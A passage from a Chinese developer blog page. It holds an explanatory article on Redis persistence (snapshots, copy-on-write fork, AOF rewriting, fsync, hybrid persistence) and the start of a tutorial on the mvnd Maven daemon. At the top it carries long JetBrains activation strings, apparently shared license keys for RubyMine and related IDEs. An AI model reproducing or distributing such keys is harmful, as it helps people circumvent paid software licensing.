J0cc8cgzmCUr3E/QABzU1CdpqY0hyCedCvb9IOwfmTH+ug==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="rubymine专用"><a class="markdownIt-Anchor" href="#rubymine专用">#</a> <strong>RubyMine 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EZK4R5UGRP-eyJsaWNlbnNlSWQiOiJFWks0UjVVR1JQIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBSQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUk0iLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDoxOTE2MTQ0NDI2IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-Bc16m/sJ8qqPmC6hBp93iF6Y3vU9CgV5PhPpWDM3p5qEu3oM/BnP3TuTK4uxuaXo16JJF5N0RhV1n4Od7mq83La246o9e2tzTBEwniF19U3zUgOHk9arYIluefGJODHrY07uYfFJzF+i5XXZ7fVOVz1IjWtcU5Mdet/48gh2RVMRPvIi5JHZi1dRawzBKUwTzOeBGvs2GRSqWphxxc5uUqmOhQiIcNK3IBcZS8gANY0XaFmF6gkglNl7g1fPP9nZ79MWWlvDuqlXmVMCiS2OFiMNfAsJ8fjIWiY32r3PlnV/ES356fwYnVDw9ATvRZL05VaRKrLSfKuq8E/ewiRGxA==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-16T13:20:05.000Z" title="2023/4/16 21:20:05">2023-04-16</time>发表</span><span class="level-item"><time dateTime="2020-11-11T00:42:07.000Z" title="2020/11/11 08:42:07">2020-11-11</time>更新</span><span class="level-item">22 分钟读完 (大约3357个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/16/%E3%80%90Redis%E3%80%91Redis%E6%8C%81%E4%B9%85%E5%8C%96/">Redis持久化</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h3 id="一-持久化简介"><a class="markdownIt-Anchor" href="#一-持久化简介">#</a> <strong>一、持久化简介</strong></h3>
<p><strong>Redis</strong> 的数据 <strong>全部存储</strong> 在 <strong>内存</strong> 中，如果 <strong>突然宕机</strong>，数据就会全部丢失，因此必须有一套机制来保证 Redis 的数据不会因为故障而丢失，这种机制就是 Redis 的 <strong>持久化机制</strong>，它会将内存中的数据库状态保存到磁盘 中。</p>
<p><strong>持久化发生了什么</strong>？ <strong>|</strong> <strong>从内存到磁盘</strong>：</p>
<p>我们来稍微考虑一下 <strong>Redis</strong> 作为一个内存数据库 要做的关于持久化的事情。通常来说，从客户端发</p>
<p>起请求开始，到服务器真实地写入磁盘，需要发生如下几件事情：</p>
<p><strong>详细版</strong> 的文字描述大概就是下面这样：</p>
<p>\1. 客户端向数据库 <strong>发送写命令</strong> <em>(<em>数据在客户端的内存中</em>)</em></p>
<p>\2. 数据库 <strong>接收</strong> 到客户端的 <strong>写请求</strong> <em>(<em>数据在服务器的内存中</em>)</em></p>
<p>\3. 数据库 <strong>调用系统</strong> <strong>API</strong> 将数据写入磁盘 <em>(<em>数据在内核缓冲区中</em>)</em></p>
<p>\4. 操作系统将 <strong>写缓冲区</strong> 传输到 <strong>磁盘控控制器</strong> <em>(<em>数据在磁盘缓存中</em>)</em></p>
<p>\5. 操作系统的磁盘控制器将数据 <strong>写入实际的物理媒介</strong> 中 <em>(<em>数据在磁盘中</em>)</em></p>
<p>** 注意、上面的过程其实是 ** 极度精简 的，在实际的操作系统中，<strong>缓存</strong> 和 <strong>缓冲区</strong> 会比这 <strong>多得多</strong>…</p>
<h3 id="如何尽可能保证持久化的安全"><a class="markdownIt-Anchor" href="#如何尽可能保证持久化的安全">#</a> <strong>如何尽可能保证持久化的安全</strong></h3>
<p>如果我们故障仅仅涉及到 <strong>软件层面</strong> <em>(<em>该进程被管理员终止或程序崩溃</em>)</em> 并且没有接触到内核，那么在 上 述步骤 <em>3</em> 成功返回之后，我们就认为成功了。即使进程崩溃，操作系统仍然会帮助我们把数据正确地写入磁盘。</p>
<p>如果我们考虑 ** 停电 ** 火灾 等 <strong>更具灾难性</strong> 的事情，那么只有在完成了第 <strong>5</strong> 步之后，才是安全的。</p>
<p>所以我们可以总结得出数据安全最重要的阶段是：<strong>步骤三、四、五</strong>，即：</p>
<p>数据库软件调用写操作将用户空间的缓冲区转移到内核缓冲区的频率是多少？</p>
<p>内核多久从缓冲区取数据刷新到磁盘控制器？</p>
<p>磁盘控制器多久把数据写入物理媒介一次？</p>
<p><strong>注意：</strong> 如果真的发生灾难性的事件，我们可以从上图的过程中看到，任何一步都可能被意外打断</p>
<p>丢失，所以只能 <strong>尽可能地保证</strong> 数据的安全，这对于所有数据库来说都是一样的。</p>
<p>我们从 <strong>第三步</strong> 开始。Linux 系统提供了清晰、易用的用于操作文件的 POSIX file API ， 20 多年过</p>
<p>去，仍然还有很多人对于这一套 API 的设计津津乐道，我想其中一个原因就是因为你光从 API 的命名</p>
<p>就能够很清晰地知道这一套 API 的用途：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(const <span class="type">char</span> *path, <span class="type">int</span> oflag, ...<span class="comment">/*,mode_t mode */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span> <span class="params">(<span class="type">int</span> filedes)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">remove</span><span class="params">( const <span class="type">char</span> *fname )</span>; </span><br><span class="line">ssize_t <span class="title function_">write</span><span class="params">(<span class="type">int</span> fildes, const <span class="keyword">void</span> *buf, size_t nbyte)</span>;</span><br><span class="line">ssize_t <span class="title function_">read</span><span class="params">(<span class="type">int</span> fildes, <span class="keyword">void</span> *buf, size_t nbyte)</span>;</span><br></pre></td></tr></table></figure>
<p>所以，我们有很好的可用的 API 来完成 <strong>第三步</strong>，但是对于成功返回之前，我们对系统调用花费的时间没有太多的控制权。</p>
<p>然后我们来说说 <strong>第四步</strong>。我们知道，除了早期对电脑特别了解那帮人 <em>(<em>操作系统就这帮人搞的</em>)</em>，实际的物理硬件都不是我们能够 <strong>直接操作</strong> 的，都是通过 <strong>操作系统调用</strong> 来达到目的的。为了防止过慢的 I/O 操作拖慢整个系统的运行，操作系统层面做了很多的努力，譬如说 <strong>上述第四步</strong> 提到的 <strong>写缓冲区</strong>，并不是所有的写操作都会被立即写入磁盘，而是要先经过一个缓冲区，默认情况下，Linux 将在 <strong>30</strong> <strong>秒</strong> 后实际提交写入。</p>
<p>但是很明显，<strong>30</strong> <strong>秒</strong> 并不是 Redis 能够承受的，这意味着，如果发生故障，那么最近 30 秒内写入的所有数据都可能会丢失。幸好 PROSIX API 提供了另一个解决方案： fsync ，该命令会 <strong>强制</strong> 内核将 <strong>缓 **** 冲区</strong> 写入 <strong>磁盘</strong>，但这是一个非常消耗性能的操作，每次调用都会 <strong>阻塞等待</strong> 直到设备报告 IO 完成，所以一般在生产环境的服务器中，<strong>Redis</strong> 通常是每隔 1s 左右执行一次 fsync 操作。到目前为止，我们了解到了如何控制 第三步 和 第四步 ，但是对于 <strong>第五步</strong>，我们 <strong>完全无法控制</strong>。也许一些内核实现将试图告诉驱动实际提交物理介质上的数据，或者控制器可能会为了提高速度而重新排序写操作，不会尽快将数据真正写到磁盘上，而是会等待几个多毫秒。这完全是我们无法控制的。</p>
<h3 id="二-redis-中的两种持久化方式"><a class="markdownIt-Anchor" href="#二-redis-中的两种持久化方式">#</a> ** 二、Redis ** 中的两种持久化方式</h3>
<p><strong>方式一：快照</strong></p>
<p><strong>Redis</strong> <strong>快照</strong> 是最简单的 Redis 持久性模式。当满足特定条件时，它将生成数据集的时间点快照，例如，</p>
<p>如果先前的快照是在 2 分钟前创建的，并且现在已经至少有 <em>100</em> 次新写入，则将创建一个新的快照。此条件可以由用户配置 Redis 实例来控制，也可以在运行时修改而无需重新启动服务器。快照作为包含整个数据集的单个 .rdb 文件生成。</p>
<p>但我们知道，Redis 是一个 <strong>单线程</strong> 的程序，这意味着，我们不仅仅要响应用户的请求，还需要进行内存快照。而后者要求 Redis 必须进行 IO 操作，这会严重拖累服务器的性能。</p>
<p>还有一个重要的问题是，我们在 <strong>持久化的同时</strong>，<strong>内存数据结构</strong> 还可能在 <strong>变化</strong>，比如一个大型的 hash 字典正在持久化，结果一个请求过来把它删除了，可是这才刚持久化结束，咋办？</p>
<p><strong>使用系统多进程</strong> <strong>COW(Copy On Write)</strong> <strong>机制</strong> <strong>| fork</strong> <strong>函数</strong></p>
<p>操作系统多进程 <strong>COW(Copy On Write)</strong> <strong>机制</strong> 拯救了我们。<strong>Redis</strong> 在持久化时会调用 glibc 的函数</p>
<p>fork 产生一个子进程，简单理解也就是基于当前进程 <strong>复制</strong> 了一个进程，主进程和子进程会共享内存</p>
<p>里面的代码块和数据段：</p>
<p>这里多说一点，<strong>为什么</strong> <strong>fork</strong> <strong>成功调用后会有两个返回值呢？</strong> 因为子进程在复制时复制了父进程的堆栈</p>
<p>段，所以两个进程都停留在了 fork 函数中 <em>(<em>都在同一个地方往下继续</em> &quot;<em> 同时</em> &quot;<em> 执行</em>)</em>，等待返回，所以 <strong>一</strong></p>
<p><strong>次在父进程中返回子进程的</strong> <strong>pid</strong>**，另一次在子进程中返回零，系统资源不够时返回负数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pid = os.fork() </span><br><span class="line">  <span class="keyword">if</span> pid &gt; 0a:</span><br><span class="line">	handle_client_request() # 父进程继续处理客户端请求 </span><br><span class="line">  <span class="keyword">if</span> pid == <span class="number">0</span>: </span><br><span class="line">    handle_snapshot_write() # 子进程处理快照写磁盘 </span><br><span class="line">  <span class="keyword">if</span> pid &lt; <span class="number">0</span>: # fork error</span><br></pre></td></tr></table></figure>
<p>所以 <strong>快照持久化</strong> 可以完全交给 <strong>子进程</strong> 来处理，<strong>父进程</strong> 则继续 <strong>处理客户端请求</strong>。<strong>子进程</strong> 做数据持久</p>
<p>化，它 <strong>不会修改现有的内存数据结构</strong>，它只是对数据结构进行遍历读取，然后序列化写到磁盘中。但是</p>
<p><strong>父进程</strong> 不一样，它必须持续服务客户端请求，然后对 <strong>内存数据结构进行不间断的修改</strong>。</p>
<p>这个时候就会使用操作系统的 COW 机制来进行 <strong>数据段页面</strong> 的分离。数据段是由很多操作系统的页面组合而成，当父进程对其中一个页面的数据进行修改时，会将被共享的页面复 制一份分离出来，然后</p>
<p><strong>对这个复制的页面进行修改</strong>。这时 <strong>子进程</strong> 相应的页面是 <strong>没有变化的</strong>，还是进程产生时那一瞬间的数据。</p>
<p>子进程因为数据没有变化，它能看到的内存里的数据在进程产生的一瞬间就凝固了，再也不会改变，这也是为什么 <strong>Redis</strong> 的持久化 <strong>叫「快照」的原因</strong>。接下来子进程就可以非常安心的遍历数据了进行序列化写磁盘了。</p>
<p><strong>快照不是很持久</strong>。如果运行 Redis 的计算机停止运行，电源线出现故障或者您 kill -9 的实例意外发生，则写入 Redis 的最新数据将丢失。尽管这对于某些应用程序可能不是什么大问题，但有些使用案例具有充分的耐用性，在这些情况下，快照并不是可行的选择。</p>
<p><strong>AOF(Append Only File -</strong> <strong>仅追加文件</strong> **)** 它的工作方式非常简单：每次执行 <strong>修改内存</strong> 中数据集的写操作时，都会 <strong>记录</strong> 该操作。假设 AOF 日志记录了自 Redis 实例创建以来 <strong>所有的修改性指令序列</strong>，那么就可以通过对一个空的 Redis 实例 <strong>顺序执行所有的指令</strong>，也就是 <strong>「重放」</strong>，来恢复 Redis 当前实例的内存数据结构的状态。</p>
<h3 id="aof重写"><a class="markdownIt-Anchor" href="#aof重写">#</a> AOF 重写</h3>
<p><strong>Redis</strong> 在长期运行的过程中，AOF 的日志会越变越长。如果实例宕机重启，重放整个 AOF 日志会非常耗时，导致长时间 Redis 无法对外提供服务。所以需要对 <strong>AOF</strong> <strong>日志</strong> 瘦身。</p>
<p><strong>Redis</strong> 提供了 bgrewriteaof 指令用于对 AOF 日志进行瘦身。其 <strong>原理</strong> 就是 <strong>开辟一个子进程</strong> 对内存进行 <strong>遍历</strong> 转换成一系列 Redis 的操作指令，<strong>序列化到一个新的</strong> <strong>AOF</strong> <strong>日志文件</strong> 中。序列化完毕后再将操作期间发生的 <strong>增量</strong> <strong>AOF</strong> <strong>日志</strong> 追加到这个新的 AOF 日志文件中，追加完毕后就立即替代旧的 AOF 日志文件了，瘦身工作就完成了。</p>
<p><strong>fsync</strong></p>
<p>AOF 日志是以文件的形式存在的，当程序对 AOF 日志文件进行写操作时，实际上是将内容写到了内核</p>
<p>为文件描述符分配的一个内存缓存中，然后内核会异步将脏数据刷回到磁盘的。</p>
<p>就像我们 上方第四步 描述的那样，我们需要借助 glibc 提供的 fsync (int fd) 函数来讲指定的文件内容 <strong>强制从内核缓存刷到磁盘</strong>。但 强制开车 仍然是一个很消耗资源的一个过程，需要 节制！通常来说，生产环境的服务器，Redis 每隔 1s 左右执行一次 fsync 操作就可以了。</p>
<p>Redis 同样也提供了另外两种策略，一个是 <strong>永不</strong> <strong>fsync</strong>，来让操作系统来决定合适同步磁盘，很不安全，另一个是 <strong>来一个指令就</strong> <strong>fsync</strong> <strong>一次</strong>，非常慢。但是在生产环境基本不会使用，了解一下即可。</p>
<h3 id="redis-40混合持久化"><a class="markdownIt-Anchor" href="#redis-40混合持久化">#</a> <strong>Redis 4.0</strong> 混合持久化</h3>
<p>重启 Redis 时，我们很少使用 rdb 来恢复内存状态，因为会丢失大量数据。我们通常使用 AOF 日志重放，但是重放 AOF 日志性能相对 rdb 来说要慢很多，这样在 Redis 实例很大的情况下，启动需要花费很长的时间。</p>
<p><strong>Redis 4.0</strong> 为了解决这个问题，带来了一个新的持久化选项 ——<strong> 混合持久化</strong>。将 rdb 文件的内容和增量的 AOF 日志文件存在一起。这里的 AOF 日志不再是全量的日志，而是 <strong>自持久化开始到持久化结束</strong> 的</p>
<p>这段时间发生的增量 AOF 日志，通常这部分 AOF 日志很小：</p>
<p>于是在 Redis 重启的时候，可以先加载 rdb 的内容，然后再重放增量 AOF 日志就可以完全替代之前的 AOF 全量文件重放，重启效率因此大幅得到提升。</p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-07T22:19:38.000Z" title="2023/4/8 06:19:38">2023-04-08</time>发表</span><span class="level-item"><time dateTime="2019-08-27T12:54:14.000Z" title="2019/8/27 20:54:14">2019-08-27</time>更新</span><span class="level-item">8 分钟读完 (大约1225个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/08/%E3%80%90Maven%E3%80%91Maven%E5%8A%A0%E5%BC%BA%E7%89%88%20%E2%80%94%20mvnd%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/">Maven加强版 — mvnd的使用测试</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="maven加强版-mvnd的使用测试"><a class="markdownIt-Anchor" href="#maven加强版-mvnd的使用测试">#</a> Maven 加强版 — mvnd 的使用测试</h1>
<p>Maven、gradle 作为主流的构建工具，几乎所有的 Java 项目都使用，但是 Maven 相对 gradle 来说，构建还是太慢了。特别是构建十几个子项目的程序。</p>
<p>如果要把项目从 Maven 转换成 gradle，成本也是巨大的。</p>
<p>但是现在有了 maven-mvnd ，可以使构建变得更快。</p>
<h2 id="1-maven-mvnd介绍"><a class="markdownIt-Anchor" href="#1-maven-mvnd介绍">#</a> <strong>1、maven-mvnd 介绍</strong></h2>
<p><code>maven-mvnd</code>  是 <code>Apache Maven团队</code> 借鉴了 <code>Gradle</code>  和 <code>Takari</code>  的优点，衍生出来的更快的构建工具，是 maven 的 <code>强化版</code> 。</p>
<p>github 地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/maven-mvnd">https://github.com/apache/maven-mvnd</a></p>
<p>maven-mvnd 特性：</p>
<ul>
<li>嵌入 Maven (所以不需要单独安装 Maven)； <code>maven 过渡到 maven-mvnd</code>  的过程中实现  <code>无缝切换</code> ！所以不需要再安装 maven 或进行复杂的配置更改。</li>
<li>实际的构建发生在一个长期存在的后台进程中，也就是守护进程。如果没有为构建请求服务的空闲守护进程，则可以并行产生多个守护进程。</li>
<li>一个守护进程实例可以处理来自 mvnd 客户机的多个连续请求。</li>
<li>使用 GraalVM 构建的本地可执行文件。与传统的 JVM 相比，它启动更快，使用的内存更少。</li>
</ul>
<p>这种架构带来的优势有：</p>
<ul>
<li>运行实际构建的 JVM 不需要为每个构建重新启动，节省时间。</li>
<li>JVM 中的实时 (JIT) 编译器生成的本机代码也保留了下来。与 Maven 相比，JIT 编译花费的时间更少。在重复构建过程中，JIT 优化的代码可以立即使用。这不仅适用于来自 Maven 插件和 Maven Core 的代码，也适用于来自 JDK 本身的所有代码。</li>
</ul>
<h2 id="2-使用步骤"><a class="markdownIt-Anchor" href="#2-使用步骤">#</a> <strong>2、使用步骤</strong></h2>
<h3 id="21-下载"><a class="markdownIt-Anchor" href="#21-下载">#</a> <strong>2.1、下载</strong></h3>
<p>下载：<a href="https://link.zhihu.com/?target=https%3A//github.com/mvndaemon/mvnd/releases">https://github.com/mvndaemon/mvnd/releases</a></p>
<p><img src="https://brath.cloud/blogImg/v2-a58a6f79a75eeeb834275d74212cacb1_720w.jpg" alt="img"></p>
<p>我这里是 windows，下载  <code>mvnd-0.7.1-windows-amd64.zip</code>  版本即可。</p>
<h3 id="22-安装"><a class="markdownIt-Anchor" href="#22-安装">#</a> <strong>2.2、安装</strong></h3>
<p>直接解压。</p>
<p>然后配置环境变量：将 bin 目录添加到 PATH</p>
<h3 id="23-测试"><a class="markdownIt-Anchor" href="#23-测试">#</a> <strong>2.3、测试</strong></h3>
<p>打开 CMD 终端，输入  <code>mvnd -v</code></p>
<p>可以看到如下信息表示安装成功：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HaC&gt; mvnd -v</span><br><span class="line">mvnd native client 0.7.1-windows-amd64 (97c587c11383a67b5bd0ff8388bd94c694b91c1e)</span><br><span class="line">Terminal: org.jline.terminal.impl.jansi.win.JansiWinSysTerminal</span><br><span class="line">Apache Maven 3.8.3 (ff8e977a158738155dc465c6a97ffaf31982d739)</span><br><span class="line">Maven home: E:\apache-mvnd-0.7.1-windows-amd64\mvn</span><br><span class="line">Java version: 1.8.0_131, vendor: Oracle Corporation, runtime: E:\JDK1.8\jre</span><br><span class="line">Default locale: zh_CN, platform encoding: GBK</span><br><span class="line">OS name: &quot;windows 10&quot;, version: &quot;10.0&quot;, arch: &quot;amd64&quot;, family: &quot;windows&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到 mvnd 集成了 Maven 3.8.3 版本。</p>
<h3 id="24-使用"><a class="markdownIt-Anchor" href="#24-使用">#</a> <strong>2.4、使用</strong></h3>
<p>在使用上和 Maven 一样，参数也一致。</p>
<p>Maven 使用  <code>mvn clean package</code>  ；使用 Maven-mvnd 只需要变成  <code>mvnd clean package</code>  即可，其他同理。</p>
<h3 id="25-配置修改"><a class="markdownIt-Anchor" href="#25-配置修改">#</a> <strong>2.5、配置修改</strong></h3>
<p>为了最小程度的兼容原来的 Maven，可以使用原来的  <code>setting.xml</code></p>
<p>打开 Maven-mvnd 安装目录下 的  <code>/conf/mvnd.properties</code>  文件，修改：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">maven.settings</span>=<span class="string">E://apache-maven-3.5.4-bin//apache-maven-3.5.4//conf//settings.xml</span></span><br></pre></td></tr></table></figure>
<p>（注意是  <code>//</code> ）</p>
<h2 id="3-打包对比"><a class="markdownIt-Anchor" href="#3-打包对比">#</a> <strong>3、打包对比</strong></h2>
<p>由于 mvnd-0.7.1 版本使用了 Maven 3.8.3 版本，我这里同样使用 Maven 3.8.3 进行对比。</p>
<p>命令：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># maven 打包命令</span><br><span class="line">mvn clean package -Dmaven.test.skip=true</span><br><span class="line"># mvnd 打包命令</span><br><span class="line">mvnd clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>
<p>电脑配置：</p>
<p>CPU：Intel® Core™ i7-4790 CPU @ 3.60GHz 3.60 GHz</p>
